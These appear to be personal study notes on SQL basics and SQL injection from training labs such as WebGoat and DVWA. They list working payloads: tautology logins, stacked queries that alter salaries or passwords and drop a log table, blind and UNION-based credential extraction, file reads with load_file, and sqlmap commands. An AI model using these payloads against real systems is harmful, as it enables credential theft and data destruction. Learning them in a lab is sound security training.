# sql basics

## update
* update employee: `UPDATE Employees SET department='Sales',street='test' WHERE last_name='Barnett';`
* SElect user
## insert
INSERT INTO Customers (CustomerName, ContactName, Address, City, PostalCode, Country)
VALUES ('Cardinal', 'Tom B. Erichsen', 'Skagen 21', 'Stavanger', '4006', 'Norway');

INSERT INTO Customers (CustomerName, ContactName, Address, City, PostalCode, Country)
VALUES (''), 'Tom B. Erichsen', 'Skagen 21', 'Stavanger', '4006', 'Norway');

## LIKE
* injection: `'OR '1'='1`

SELECT Count(*) FROM Customers
WHERE CustomerName LIKE ''OR '1'='1';

test' OR 1=1; UPDATE Employees SET password='12345' WHERE first_name='Tom' OR '1'='2 

# substring
Extract 5 characters from the "CustomerName" column, starting in position 1:
 SELECT SUBSTRING(CustomerName, 1, 5) AS ExtractString
FROM Customers;
Prints: 
Adolf
Delel
DKeek
...

Exploit: `tom' and substring(password,1,1)='t`

## ddl
* Data Definition Language (DDL) commands: CREATE, ALTER, DROP

*This statement creates the employees example table* 
CREATE TABLE employees(
    userid varchar(6) not null primary key,
    first_name varchar(20),
    last_name varchar(20),
    department varchar(20),
    salary varchar(10),
    auth_tan varchar(6)
);

*Adds phone columns to table employees*
 ``ALTER TABLE employees 
 ADD phone varchar(20)``

# Data Control Language (DCL)
Data control language is used to create privileges to allow users to access and manipulate the database.
* GRANT - allow users access privileges to the database
* REVOKE - withdraw users access privileges given by using the GRANT command

*This statement gives all users of the operator-role the privilege to create new tables in the database.*
GRANT CREATE TABLE
TO operator;

*Grant the usergroup "UnauthorizedUser" the right to alter tables*
`GRANT ALTER TABLE TO UnauthorizedUser;`

# special chars
* `/* */`  are inline comments
* `-- , #` are line comments
* `;` allows query chaining `SELECT * FROM users; DROP TABLE users;`
* `',+,||`	 allows string concatenation
* `Char()`	 strings without quotes => `SELECT * FROM users WHERE name = '+char(27) OR 1=1`

# Union
The Union operator is used, to combine the results of two or more SELECT Statements.
`SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;`

# Join
Combine rows from two or more tables
`SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;`

# start first with
Try to only put ' or “ in
try ``'`` in fields to check how it behaves

# if the first step works go with injection

``select * from users where email='$email' and password='pw'``
//ends with comment (``--``) to ignore rest  
``select * from users where email=' ' OR 1=1--' and password='pw' ``
2) ' OR 1=1--
3) ' OR 1=1; --
4) ' OR 1=1;#
5) ' OR '1'='1'
6) numeric: `2 OR 1=1`

## String SQL injection (CIA-Triad)

### comprimising confidentiality
* if queries are built dynamically in the application by concatenating strings to it, this makes it very susceptible to String SQL injection
* If the input takes a string that gets inserted into a query as a string parameter, then you can easily  yend the string parameter with quotation marks and input your own SQL after that.
`"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';`
auth_tan = `' OR 1=1--`

### compromising integritiy
changes the information which should not have been accessed
`' OR 1=1; UPDATE employees SET salary=90000 WHERE last_name='Smith''--`

### compomising availablity
There are many different ways to violate availability. If an account is deleted or the password gets changed, the actual owner cannot access it anymore. Attackers could also try to delete parts of the database...

The underlying SQL query looks like that: `"SELECT * FROM access_log WHERE action LIKE '%" + action + "%'"`
//Dripping an access_log table to delete track
`'; drop table access_log--`

# Blind SQL injection
asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection. So no SQL error message shown.

* we have url: https://my-shop.com?article=4
* backend takes it like this: `SELECT * FROM articles WHERE article_id = 4`
* We might manipulate it like `https://my-shop.com?article=4 AND 1=1` If same page returned as on https://shop.example.com?article=4 you know the website is vulnerable for a blind SQL injection
* If browser responds with a page not found => not vulnurable to blind SQL
* `https://shop.example.com?article=4 AND 1=2` which will not return anything because the query returns false.
* Exploit: `https://shop.example.com?article=4 AND substring(database_version(),1,1) = 2` but can also be `AND substring(password,1,1) = 2`or `tom' and substring(password,1,1)='t` to check if first letter of pw is "t"s
* OR time based SQL injection: `article = 4; sleep(10) --`



## enumerate db
``id=1 order by 1``
* Then you can enumerate user automatically one by one

## union
//to get version
``id=1 union all select 1,2, @@version``
//to get database user
``id=1 union all select 1,2, user()``

//to get table schemas and treive some intersting column name
``id=1 union all select 1,2, table_name from information_schema.tables``
//column name for instance "users"
``id=1 union all select 1,2, table_name from information_schema.tables where table_Name='users'``

//we then for instance see columns usernames and passwords, can tackle it with:
``id=1 union all select 1,username,password from users``

# code execution to read and write files in the system
``id=1 union all select 1,2, load_file('C:/Windows/System32/drivers/etc/hosts')``

# sqlmap 

``sqlmap -cookie="security=high; PHPSESSID=a3a6968ac0cb1775f890061af0b42108"" -u “http://192.168.0.6/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#”``
* to just run in mysql and not maria db
``sqlmap -u “http://192.168.0.6/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#” --dbms=mysql``

* better to sent request trough ZAP proxy save the request somehwere and the to run it with the file:
``sqlmap -r "/home/kali/Documents/sqlinj.raw"``

* enumerate all sql tables to get an full reports of them
``sqlmap -r "/home/kali/Documents/sqlinj.raw" --tables``

* sql map to find a spefic string in the response "please try to..." and sql attack only username_reg also return DB
`sqlmap -r request.txt --string "please try to register with a different username" -p username_reg --threads 1`

# Process for sql (automated)
1) locate vuln field (check blind sql) or automated: `ssqlmap -r /home/kali/Documents/sqlInj2.raw --string "please try to register with a different username" --thread=1` dbms we get from this response

2) get db from the vuln field: `sqlmap -r "/home/kali/Documents/sqlInj.raw" --string "please try to register with a different username" -p username_reg --threads 1 --dbms="HSQLDB" --current-db`
reurns: 

[17:42:07] [INFO] the back-end DBMS is HSQLDB
back-end DBMS: HSQLDB >= 2.0.0 and < 2.3.0
current database (equivalent to schema on HSQLDB): 'PUBLIC'

3) to get tables from a DB (when we have a vulnurable field: in our case: username_reg)
``sqlmap -r "/home/kali/Documents/sqlInj.raw" --string "please try to register with a different username" -p username_reg --thread=10 --technique=B --dbms="HSQLDB" -D PUBLIC --tables --level=5 --risk=3``
usually this returns us a table which we can enumerate its rows by f.e.: CHALLENGE_USERS
`sqlmap -r request.txt --string "please try to register with a different username" -p username_reg --thread=1 --technique=B --dbms="HSQLDB" -D PUBLIC -T CHALLENGE_USERS --columns --level=5 --risk=3`
